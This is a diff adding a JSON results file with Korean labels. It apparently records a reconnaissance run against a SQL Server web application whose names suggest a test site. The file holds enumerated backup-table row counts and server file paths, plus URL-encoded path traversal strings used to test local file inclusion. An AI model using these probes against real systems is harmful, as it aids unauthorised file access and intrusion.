@@ -1,0 +1,40 @@
+{
+  "msdb.dbo.backupset 행수": 6,
+  "msdb.dbo.backupmediafamily 행수": 6,
+  "msdb.dbo.backupfile 행수": 12,
+  "msdb.dbo.sysjobs 행수(SQL Agent 작업)": null,
+  "sys.master_files 행수": 0,
+  "sys.databases 행수": 7,
+  "sys.dm_server_services 조회 가능": null,
+  "msdb.dbo.backuphistory 조회 가능": null,
+  "sys.dm_os_sys_info 조회 가능": null,
+  "paths": {
+    "InstanceDefaultDataPath": "C:\\Program Files\\Microsoft SQL Server\\MSSQL12.SQL\\MSSQL\\DATA\\",
+    "InstanceDefaultLogPath": "C:\\Program Files\\Microsoft SQL Server\\MSSQL12.SQL\\MSSQL\\DATA\\",
+    "InstanceDefaultBackupPath": null,
+    "backupmediafamily.physical_device_name": "C:\\Backup_testasp_testaspnet_1apr2021\\Databases\\Backup_from_Management_Studio\\acublog_1apr",
+    "master_files DB=acuforum file_id=1": null,
+    "master_files DB=acuforum file_id=2": null
+  },
+  "lfi_reachability": {
+    "InstanceDefaultDataPath": {
+      "lfi_item": "..%2f..%2fProgram Files%2fMicrosoft SQL Server%2fMSSQL12.SQL%2fMSSQL%2fDATA%2f",
+      "code": 0,
+      "size": 160,
+      "reachable": false
+    },
+    "InstanceDefaultLogPath": {
+      "lfi_item": "..%2f..%2fProgram Files%2fMicrosoft SQL Server%2fMSSQL12.SQL%2fMSSQL%2fDATA%2f",
+      "code": 0,
+      "size": 160,
+      "reachable": false
+    },
+    "backupmediafamily.physical_device_name": {
+      "lfi_item": "..%2f..%2fBackup_testasp_testaspnet_1apr2021%2fDatabases%2fBackup_from_Management_Studio%2facublog_1apr",
+      "code": 500,
+      "size": 1208,
+      "reachable": false
+    }
+  },
+  "requests": 1589
+}
